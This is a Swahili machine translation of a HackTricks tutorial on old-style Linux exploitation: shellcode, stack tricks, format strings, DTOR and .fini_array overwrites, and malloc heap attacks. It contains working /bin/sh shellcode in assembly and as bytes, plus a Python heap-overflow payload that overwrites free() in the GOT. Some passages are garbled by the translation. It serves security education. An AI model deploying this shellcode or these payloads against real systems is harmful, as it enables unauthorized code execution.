# Kudukua Linux (Msingi) (SPA)

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **2.SHELLCODE**

Angalia mapumziko ya kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; safisha eax\
xor ebx, ebx ; ebx = 0 kwa sababu hakuna hoja ya kupitisha\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Tekeleza syscall

**nasm -f elf assembly.asm** ‚Äî> Inarudi .o\
**ld assembly.o -o shellcodeout** ‚Äî> Inatoa faili inayoweza kutekelezwa iliyoundwa na msimbo wa mkusanyiko na tunaweza kutoa opcodes na **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kwamba kwa kweli ni shellcode yetu na kutoa OpCodes

**Thibitisha kuwa shellcode inafanya kazi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Ili kuhakikisha kwamba wito wa mfumo unafanywa kwa usahihi, programu iliyopita inapaswa kuchakatwa na wito wa mfumo unapaswa kuonekana katika **strace ./PROGRAMA\_COMPILADO**

Wakati wa kuunda shellcodes, unaweza kutumia hila. Maagizo ya kwanza ni jump kwenda kwenye wito. Wito unaita msimbo wa awali na pia huingiza EIP kwenye stack. Baada ya maagizo ya wito, tumeweka string tunayohitaji, kwa hivyo na EIP hiyo tunaweza kuelekeza kwenye string na kuendelea kutekeleza msimbo.

EJ **HILA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Kutumia Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Mwindaji wa Yai:**

Inajumuisha nambari ndogo inayopitia kurasa za kumbukumbu zinazohusiana na mchakato kutafuta shellcode iliyohifadhiwa hapo (inatafuta saini fulani iliyojumuishwa kwenye shellcode). Inatumika katika hali ambapo kuna nafasi ndogo tu ya kuingiza nambari.

**Shellcodes za Polimofiki**

Hizi ni shellcodes zilizofichwa ambazo zina nambari ndogo za kuzificha na kuzikimbiza, zikitumia mbinu ya Call-Pop hii ni **mfano wa kificho kilichofichwa cha Caesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Mbinu Zingine**

**Ret2Ret**

Inatumika wakati haiwezekani kuweka anwani ya stack kwenye EIP (inathibitisha kwamba EIP hauna 0xbf) au wakati haiwezekani kuhesabu mahali pa shellcode. Lakini, kazi inayoweza kudhurika inakubali parameter (shellcode itakuwa hapa).

Kwa njia hii, kwa kubadilisha EIP na anwani ya **ret**, italeta anwani inayofuata (ambayo ni anwani ya kwanza ya argument ya kazi). Yaani, shellcode itapakiwa.

Exploit itakuwa: SHELLCODE + Kujaza (hadi EIP) + **\&ret** (bytes inayofuata ya stack inaelekeza mwanzo wa shellcode kwa sababu anwani ya parameter iliyopita imewekwa kwenye stack)

Inaonekana kazi kama **strncpy** mara baada ya kukamilika hufuta kutoka kwenye stack anwani ambapo shellcode ilikuwa imehifadhiwa ikizuia mbinu hii. Yaani, anwani wanayopitisha kama argument kwa kazi (ile inayohifadhi shellcode) inabadilishwa na 0x00 hivyo wakati wa kuita **ret** ya pili inakutana na 0x00 na programu inakufa.

**Taknolojia ya Murat**

Katika linux programu zote zinapangwa kuanzia 0xbfffffff

Kwa kuangalia jinsi stack ya mchakato mpya inavyojengwa katika linux, unaweza kuendeleza exploit ili programu ianzishwe katika mazingira ambayo variable pekee ni shellcode. Kisha anwani ya hii inaweza kuhesabiwa kama: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Kwa njia hii, unaweza kupata kwa urahisi anwani ambapo variable ya mazingira iko na shellcode.

Hii inawezekana kwa sababu kazi ya execle inaruhusu kuunda mazingira ambayo ina variable za mazingira zinazohitajika tu.

**Ruka kwenda ESP: Mtindo wa Windows**

Kwa kuwa ESP inaelekeza mwanzo wa stack daima, mbinu hii inahusisha kubadilisha EIP na anwani ya wito wa **jmp esp** au **call esp**. Kwa njia hii, shellcode inahifadhiwa baada ya kubadilisha EIP kwa sababu baada ya kutekeleza **ret** ESP itakuwa inaelekeza kwenye anwani inayofuata, mahali ambapo shellcode imehifadhiwa.

Katika kesi ambapo ASLR haipo kwenye Windows au Linux, unaweza kuita **jmp esp** au **call esp** zilizohifadhiwa kwenye kitu kinachoshirikishwa. Katika kesi ambapo ASLR iko, unaweza kutafuta ndani ya programu dhaifu yenyewe.

Zaidi ya hayo, uwezo wa kuweka shellcode baada ya uharibifu wa EIP badala ya katikati ya stack, inaruhusu maagizo ya push au pop yanayotekelezwa katikati ya kazi kutofikia shellcode (jambo ambalo lingeweza kutokea ikiwa ingewekwa katikati ya stack ya kazi).

Kwa njia sawa sana na hii, ikiwa tunajua kazi inarudisha anwani ambapo shellcode imehifadhiwa, tunaweza kuita **call eax** au **jmp eax (ret2eax).**

**Integer overflows**

Aina hii ya overflows hutokea wakati variable haijaandaliwa kushughulikia nambari kubwa kama ile inayopitishwa, labda kutokana na mkanganyiko kati ya variables zenye ishara na zisizo na ishara, kwa mfano:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Katika mfano uliopita tunaona kuwa programu inatarajia vigezo 2. La kwanza ni urefu wa string inayofuata na la pili ni string yenyewe.

Ikiwa tunaweka nambari hasi kama kigezo cha kwanza, itasema kuwa len < 256 na tutapita kizuizi hicho, na pia strlen(buffer) itakuwa chini ya l, kwani l ni unsigned int na itakuwa kubwa sana.

Aina hii ya overflows haikusudiwi kuandika kitu kwenye mchakato wa programu, bali kuzidi vichujio vilivyoundwa vibaya ili kudukua mapungufu mengine.

**Variables not initialized**

Haijulikani thamani ambayo inaweza kuchukua kutoka kwa variable ambayo haijaanzishwa na inaweza kuwa ya kuvutia kuichunguza. Inaweza kuchukua thamani iliyokuwa ikichukuliwa na variable ya kazi iliyopita na hii inaweza kudhibitiwa na mshambuliaji.

##

###

###

###

### **.fini\_array**

Kimsingi hii ni muundo na **functions ambazo zitaitwa** kabla ya programu kukamilika. Hii ni ya kuvutia ikiwa unaweza kuita **shellcode yako kwa kuruka kwenye anwani**, au katika hali ambapo unahitaji kurudi kwa main tena ili **kudukua string ya muundo mara ya pili**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Tafadhali kumbuka kwamba hii **haitasababisha** **mwanya wa milele** kwa sababu unaporudi kwenye kipengele kuu, canary atagundua, mwisho wa stack unaweza kuharibiwa na kazi haitaitwa tena. Kwa hivyo, utaweza **kuwa na utekelezaji mwingine** wa mwanya.

### **Fomati za Stringi kwa Kudumpisha Yaliyomo**

Stringi ya fomati inaweza kutumika pia kudumpisha yaliyomo kutoka kwa kumbukumbu ya programu. Kwa mfano, katika hali ifuatayo kuna **variable ya ndani kwenye stack inayoelekeza kwa bendera.** Ikiwa **utapata** mahali **kwenye kumbukumbu** ambapo **pointer** kwa **bendera** iko, unaweza kufanya **printf kufikia** anwani hiyo na **kuchapisha** bendera:

Kwa hivyo, bendera iko kwenye **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Na kutoka kwa uvujaji unaweza kuona **pointer kwa bendera** iko kwenye **parameter ya 8**:

![](<../../.gitbook/assets/image (623).png>)

Kwa hivyo, **kufikia parameter ya 8** unaweza kupata bendera:

![](<../../.gitbook/assets/image (624).png>)

Tafadhali kumbuka kufuata **udanganyifu uliopita** na kugundua unaweza **kuvuja yaliyomo** unaweza **kuweka pointers** kwa **`printf`** kwenye sehemu ambapo **inakimbia** na **kudump** kabisa!

### **DTOR**

{% hint style="danger" %}
Leo ni nadra sana **kupata binary na sehemu ya dtor**.
{% endhint %}

Waharibifu ni kazi ambazo **hutekelezwa kabla ya programu kukamilika**. Ikiwa unaweza **kuandika** anwani ya **shellcode** katika **`__DTOR_END__`**, hiyo itatekelezwa kabla ya programu kuisha. Pata anwani ya sehemu hii na:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Kawaida utapata sehemu ya **DTOR** **kati** ya thamani `ffffffff` na `00000000`. Kwa hivyo ikiwa unaona thamani hizo tu, inamaanisha kwamba **hakuna kazi iliyosajiliwa**. Kwa hivyo **badilisha** **`00000000`** na **anwani** ya **shellcode** ili kuitekeleza.

### **Fomati za Strings kwa Buffer Overflows**

**sprintf** inahamisha string iliyopangwa **kwenda** kwa **variable.** Kwa hivyo, unaweza kutumia **upangaji** wa string kusababisha **buffer overflow kwenye variable** ambapo maudhui yanakopwa.\
Kwa mfano, payload `%.44xAAAA` ita **andika 44B+"AAAA" kwenye variable**, ambayo inaweza kusababisha buffer overflow.

### **Miundo ya \_\_atexit**

{% hint style="danger" %}
Leo ni **kigeni kuitumia**.
{% endhint %}

**`atexit()`** ni kazi ambayo **kazi zingine hupitishwa kama parameta.** Hizi **kazi** zitatekelezwa wakati wa kutekeleza **`exit()`** au **kurudi** kwa **msingi**.\
Ikiwa unaweza **kubadilisha** **anwani** ya mojawapo ya hizi **kazi** ili ielekee kwenye shellcode kwa mfano, utapata **udhibiti** wa **mchakato**, lakini hii ni ngumu zaidi kwa sasa.\
Kwa sasa **anwani za kazi** zitakazotekelezwa zimefichwa nyuma ya miundo kadhaa na mwishowe anwani ambayo inaelekezwa sio anwani za kazi, bali zime **fichwa kwa XOR** na viondoleo na **ufunguo wa nasibu**. Kwa hivyo kwa sasa njia hii ya shambulio sio **ya kufaa sana angalau kwa x86** na **x64\_86**.\
Kazi ya **ufichaji** ni **`PTR_MANGLE`**. **Miundo mingine** kama m68k, mips32, mips64, aarch64, arm, hppa... **hazitekelezi kazi ya ufichaji** kwa sababu **inarejesha kitu kile kile** kilichopokelewa kama kuingia. Kwa hivyo miundo hii inaweza kushambuliwa kupitia njia hii.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Leo ni **kigeni kuitumia**.
{% endhint %}

**`Setjmp()`** inaruhusu **kuhifadhi** **muktadha** (virejista)\
**`longjmp()`** inaruhusu **kurudisha** **muktadha**.\
Virejista vilivyohifadhiwa ni: `EBX, ESI, EDI, ESP, EIP, EBP`\
Kile kinachotokea ni kwamba EIP na ESP vinapitishwa na **`PTR_MANGLE`** kwa hivyo **miundo inayoweza kushambuliwa na hii ni ile ile kama ilivyotajwa hapo juu**.\
Ni muhimu kwa kupona makosa au kuingilia kati.\
Hata hivyo, kutokana na nilichosoma, virejista vingine havilindwi, **kwa hivyo ikiwa kuna `call ebx`, `call esi` au `call edi`** ndani ya kazi inayoitwa, udhibiti unaweza kuchukuliwa. Au unaweza pia kubadilisha EBP kubadilisha ESP.

**VTable na VPTR katika C++**

Kila darasa lina **Vtable** ambayo ni safu ya **pointa kwa njia.**

Kila kitu cha **darasa** kina **VPtr** ambayo ni **pointa** kwa safu ya darasa yake. VPtr ni sehemu ya kichwa cha kila kitu, kwa hivyo ikiwa **ubadilisha** **VPtr** inaweza **kubadilishwa** kuwa **pointa** kwa njia bandia ili kutekeleza kazi iende kwenye shellcode.

## **Hatua za Kuzuia na Kuepuka**

###

**Kuchukua Nafasi ya Libsafe**

Inaanzishwa na: LD\_PRELOAD=/lib/libsafe.so.2\
au\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Inazuia wito wa baadhi ya kazi hatari kwa kazi salama. Haijathibitishwa (kwa x86 pekee, sio kwa ujenzi na -fomit-frame-pointer, sio ujenzi wa static, sio kila kazi hatari inageuzwa kuwa salama na LD\_PRELOAD haifanyi kazi kwa binari zenye suid).

**Nafasi ya Anwani ya Nafasi ya ASCII**

Inahusisha kupakia maktaba zilizoshirikiwa kutoka 0x00000000 hadi 0x00ffffff ili kuhakikisha daima kuna byte 0x00. Walakini, hii haizuili mashambulizi mengi, haswa kwa little endian.

**ret2plt**

Inahusisha kufanya ROP ili kuita kazi ya strcpy@plt (kutoka kwa plt) na kuelekeza kuingia ya GOT na kunakili byte ya kwanza ya kazi inayotaka kuitwa (system()). Kisha unafanya hivyo hivyo ukiwaanisha GOT+1 na kunakili byte ya pili ya system()‚Ä¶ Mwishowe unaita anwani iliyohifadhiwa kwenye GOT ambayo itakuwa system()

**Jela na chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Inasakinisha mfumo wa msingi chini ya saraka maalum

Msimamizi anaweza kutoka kwenye moja ya majela haya kwa kufanya: mkdir foo; chroot foo; cd ..

**Ugunduzi wa Kanuni**

Valgrind ‚Äî> Inatafuta makosa\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Tunadhibiti 3 chunks mfululizo na kuziachilia kwa mpangilio wa nyuma.

Katika chunk c, shellcode inawekwa

Chunk a inatumika kusasisha b ili ukubwa uwe na biti ya PREV\_INUSE iliyozimwa ili iweze kufikiri chunk a iko huru.

Zaidi ya hayo, ukubwa unabadilishwa kwenye kichwa cha b ili iwe -4.

Kwa hivyo, programu itafikiri kwamba "a" iko huru na kwenye bin, hivyo itaita unlink() kuiondoa. Hata hivyo, kwa kuwa kichwa cha PREV\_SIZE ni -4. Itafikiri kwamba kipande cha "a" kinaanza kwenye b+4. Yaani, itafanya unlink() kwa kipande kinachoanza kwenye b+4, kwa hivyo kwenye b+12 kutakuwa na pointer "fd" na kwenye b+16 kutakuwa na pointer "bk".

Kwa njia hii, tukiweka anwani ya shellcode kwenye bk na anwani ya kazi ya "puts()" -12 kwenye fd, tunapata payload yetu.

**Mbinu ya Frontlink**

Frontlink inaitwa wakati kitu kinachiliwa na hakuna vipande vyake vya jirani vilivyo huru, unlink() haitelewi badala yake frontlink() inaitwa moja kwa moja.

Udhaifu ni muhimu wakati malloc inayoshambuliwa kamwe haiachiliwi (free()).

Inahitaji:

Buffer ambalo linaweza kufurika na kazi ya kuingiza data

Buffer unaoambatana na huu ambao unapaswa kuachiliwa na ambao shamba la fd la kichwa chake litabadilishwa kwa sababu ya kufurika kwa buffer uliopita

Buffer ya kuachiliwa na ukubwa mkubwa kuliko 512 lakini ndogo kuliko buffer uliopita

Buffer uliotangazwa kabla ya hatua ya 3 ambayo inaruhusu kusasisha prev\_size yake

Kwa njia hii, kwa kusasisha katika mallocs mbili kwa njia isiyo na kudhibitiwa na moja kwa njia iliyodhibitiwa lakini inayochiliwa tu, tunaweza kufanya shambulio.

**Udhaifu wa double free()**

Ikiwa free() inaitwa mara mbili na pointer sawa, kuna bins mbili zinazoashiria anwani ile ile.

Ikiwa unataka kutumia moja tena, itapewa bila shida. Ikiwa unataka kutumia nyingine, itapewa nafasi ile ile kwa hivyo tutakuwa na pointers "fd" na "bk" zilizodanganywa na data ambayo itaandikwa na akiba ya awali.

**Baada ya free()**

Pointer iliyotolewa awali inatumika tena bila kudhibitiwa.
Kuomba mbinu hii, mahitaji fulani lazima yatimizwe ambayo yanafanya payload kuwa ngumu kidogo zaidi.

Mbinu hii sasa haitekelezeki kwa sababu karibu na kipande sawa kilichotumika kwa unlink. Wanalinganisha ikiwa tovuti mpya inayolengwa pia inamlenga.

**Fastbin**

Ni tofauti ya The house of mind

Tunataka kutekeleza kanuni ifuatayo ambayo inafikiwa baada ya ukaguzi wa kwanza wa kazi \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Ikiwa fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Kwa njia hii, ikiwekwa kwenye "fb" inatoa anwani ya kazi kwenye GOT, kwenye anwani hii anwani ya kipande iliyobadilishwa itawekwa. Kwa hili, itakuwa muhimu kwamba uwanja uko karibu na anwani za dtors. Hasa, av->max\_fast iko kwenye anwani ambayo tunakusudia kubadilisha.

Kwa kuwa na The House of Mind tuliona kwamba sisi tulidhibiti nafasi ya av.

Kwa hivyo ikiwa tunaweka ukubwa wa 8 + NON\_MAIN\_ARENA + PREV\_INUSE kwenye uga wa ukubwa, fastbin\_index() itarudisha fastbins\[-1], ambayo italenga av->max\_fast

Katika kesi hii av->max\_fast itakuwa anwani ambayo imebadilishwa (sio anwani inayolengwa, lakini nafasi hiyo itabadilishwa).

Pia lazima iwe kwamba kipande kinachopakana na kilichowekwa huru kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema ukubwa wa kipande kilichowekwa huru ni 8, kwenye kipande hiki bandia tu lazima tuweke ukubwa mkubwa kuliko 8 (kwa kuongezea, shellcode itakuwa kwenye kipande kilichowekwa huru, itabidi tuweke mwanzoni mwa jmp ambayo itaanguka kwenye nops).

Pia, kipande hicho bandia lazima kiwe kidogo kuliko av->system\_mem. av->system\_mem iko 1848 bytes zaidi.

Kwa sababu ya nulls za \_DTOR\_END\_ na anwani chache kwenye GOT, hakuna anwani kutoka sehemu hizi zinazofaa kubadilishwa, kwa hivyo tuone jinsi ya kutumia fastbin kushambulia safu.

Njia nyingine ya shambulio ni kuelekeza **av** kuelekea safu.

Ikiwa tunabadilisha ukubwa ili iwe 16 badala ya 8 basi: fastbin\_index() itarudisha fastbins\[0] na tunaweza kutumia hii kubadilisha safu.

Kwa hili, hapana canary au thamani za ajabu kwenye safu, kwa kweli tunapaswa kuwa katika hali hii: 4bytes za null + EBP + RET

4 bytes za null zinahitajika ili **av** iwe kwenye anwani hii na kipengele cha kwanza cha **av** ni mutex ambayo lazima iwe 0.

**av->max\_fast** itakuwa EBP na itakuwa thamani ambayo itatusaidia kusonga vizuizi.

Katika **av->fastbins\[0]** itabadilishwa na anwani ya **p** na itakuwa RET, hivyo itaruka kwenye shellcode.

Pia, katika **av->system\_mem** (1484bytes juu ya nafasi kwenye safu) kutakuwa na takataka nyingi ambazo zitaruhusu kusonga ukaguzi uliofanywa.

Pia lazima iwe kwamba kipande kinachopakana na kilichowekwa huru kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema ukubwa wa kipande kilichowekwa huru ni 16, kwenye kipande hiki bandia tu lazima tuweke ukubwa mkubwa kuliko 8 (kwa kuongeza, shellcode itakuwa kwenye kipande kilichowekwa huru, itabidi tuweke mwanzoni mwa jmp ambayo itaanguka kwenye nops zinazofuata baada ya uga wa ukubwa wa kipande kipya bandia).

**The House of Spirit**

Katika kesi hii tunatafuta kuwa na pointer kwa malloc ambayo inaweza kubadilishwa na mshambuliaji (kwa mfano, pointer iko kwenye stack chini ya overflow inayowezekana kwa kipengee).

Hivyo, tunaweza kufanya pointer huu uelekee popote. Walakini, sio kila eneo ni sahihi, ukubwa wa kipande kilichobadilishwa lazima uwe mdogo kuliko av->max\_fast na haswa sawa na ukubwa ulioombwa katika wito wa baadaye wa malloc()+8. Kwa hivyo, ikiwa tunajua kwamba baada ya pointer huu wa udhaifu kuna wito wa malloc(40), ukubwa wa kipande bandia lazima uwe sawa na 48.

Kwa mfano, ikiwa programu itauliza mtumiaji nambari tunaweza kuingiza 48 na kuuelekeza pointer wa malloc uliobadilishwa kwa 4bytes zifuatazo (ambazo zinaweza kuwa sehemu ya EBP kwa bahati nzuri, hivyo 48 iko nyuma, kana kwamba ni kichwa cha ukubwa). Zaidi, anwani ptr-4+48 lazima itimize masharti kadhaa (ikiwa katika kesi hii ptr=EBP), yaani, 8 < ptr-4+48 < av->system\_mem.

Ikiwa hii itatimizwa, wakati wito ufuatao wa malloc ambao tulisema ni malloc(40) utaitwa, anwani yake itakuwa anwani ya EBP. Ikiwa mshambuliaji pia anaweza kudhibiti kile kinachoandikwa kwenye malloc hii anaweza kubadilisha EBP na EIP na anwani anayotaka.

Nadhani hii ni kwa sababu wakati free() inafuta itahifadhi kwamba kuna kipande cha ukubwa kamili kwa malloc() mpya inayotaka kuhifadhi, hivyo inamwekea anwani hiyo.

**The House of Force**

Inahitajika:

* Kujaza kwa kipande ambacho inaruhusu kubadilisha wilderness
* Wito wa malloc() na ukubwa uliowekwa na mtumiaji
* Wito wa malloc() ambao data zake zinaweza kuwa zimefafanuliwa na mtumiaji

Jambo la kwanza linalofanywa ni kubadilisha ukubwa wa kipande cha wilderness na thamani kubwa sana (0xffffffff), hivyo ombi lolote la kumbukumbu kubwa kutosha litashughulikiwa katika \_int\_malloc() bila haja ya kupanua heap

Jambo la pili ni kubadilisha av->top ili ielekee eneo la kumbukumbu chini ya udhibiti wa mshambuliaji, kama stack. Av->top itawekwa \&EIP - 8.

Tunapaswa kubadilisha av->top ili ielekee eneo la kumbukumbu chini ya udhibiti wa mshambuliaji:

mlemavu = av->top;

mabaki = chunck\_at\_offset(mlemavu, nb);

av->top = mabaki;

Mlemavu hukusanya thamani ya anwani ya kipande cha wilderness cha sasa (av->top ya sasa) na mabaki ni haswa jumla ya anwani hiyo plus idadi ya bytes zilizoombwa na malloc(). Kwa hivyo ikiwa \&EIP-8 iko kwenye 0xbffff224 na av->top ina 0x080c2788, basi kiasi tunachopaswa kuhifadhi kwenye malloc iliyodhibitiwa ili av->top ielekee $EIP-8 kwa malloc() ijayo itakuwa:

0xbffff224 - 0x080c2788 = 3086207644.

Hivyo thamani iliyobadilishwa itahifadhiwa kwenye av->top na malloc ijayo itaelekeza kwa EIP na inaweza kubadilishwa.

Ni muhimu kujua kwamba ukubwa wa kipande kipya cha wilderness uwe mkubwa kuliko ombi lililofanywa na malloc la mwisho. Yaani, ikiwa wilderness inaelekeza kwa \&EIP-8, ukubwa utabaki kwenye uga wa EBP wa stack.

**The House of Lore**

**Uharibifu wa SmallBin**

Vipande vilivyowekwa huru huingizwa kwenye bin kulingana na ukubwa wao. Lakini kabla ya kuingizwa, hufungwa kwenye bins zisizopangwa. Kipande kilichowekwa huru hakiingizwi moja kwa moja kwenye bin yake bali hubaki kwenye bins zisizopangwa. Kisha, ikiwa kipande kipya kinahitajika na kipande kilichowekwa huru kinaweza kutumika, kinarudishwa, lakini ikiwa kipande kikubwa zaidi kinahitajika, kipande kilichowekwa huru kwenye bins zisizopangwa kinaingizwa kwenye bin yake sahihi.

Ili kufikia kanuni inayoweza kudhuriwa, ombi la kumbukumbu lazima liwe kubwa kuliko av->max\_fast (kawaida 72) na chini ya MIN\_LARGE\_SIZE (512). 

Ikiwa kuna kipande kwenye bin lenye ukubwa unaofaa kwa ombi, kipande hicho kitarejeshwa baada ya kufunguliwa:

bck = mlemavu->bk; Inaelekeza kwenye kipande kilichotangulia, hii ndio habari pekee tunayoweza kubadilisha.

bin->bk = bck; Kipande cha pili kinakuwa cha mwisho, ikiwa bck inaelekeza kwenye stack, kipande kifuatacho kilichowekwa kitapewa anwani hii

bck->fd = bin; Orodha inafungwa kwa kufanya hii ielekee kwa bin

Inahitajika:
Reserve malloc mbili, ili ya kwanza iweze kufanya overflow baada ya ya pili kuwa imeachiliwa na kuingizwa kwenye bin yake (yaani, malloc kubwa zaidi kuliko ya pili kabla ya kufanya overflow)

Malloc iliyoreserviwa ambayo inapewa anwani iliyochaguliwa na mshambuliaji inadhibitiwa na mshambuliaji.

Lengo ni, ikiwa tunaweza kufanya overflow kwa heap ambayo ina sehemu iliyofunguliwa chini yake na kwenye bin yake, tunaweza kubadilisha pointer yake bk. Ikiwa tunabadilisha pointer yake bk na sehemu hii inakuwa ya kwanza kwenye orodha ya bin na kuhifadhiwa, bin itadanganywa na kuelezwa kuwa sehemu ya mwisho ya orodha (inayofuata kutoa) iko kwenye anwani ya uwongo tuliyoweka (kwenye stack au GOT kwa mfano). Kwa hivyo, ikiwa sehemu nyingine itahifadhiwa na mshambuliaji ana ruhusa ndani yake, atapewa sehemu kwenye nafasi inayotakiwa na ataweza kuandika ndani yake.

Baada ya kufungua sehemu iliyobadilishwa ni muhimu kuhifadhi sehemu kubwa kuliko ile iliyofunguliwa, hivyo sehemu iliyobadilishwa itatoka kwenye unsorted bins na kuingizwa kwenye bin yake.

Marafiki kwenye bin wanapaswa kusubiri hadi wito wa malloc() wa kutosha ufanyike ili bin iliyobadilishwa itumike tena na kudanganya bin kuamini kwamba sehemu inayofuata iko kwenye anwani ya uwongo. Na kisha sehemu inayotakiwa itatolewa.

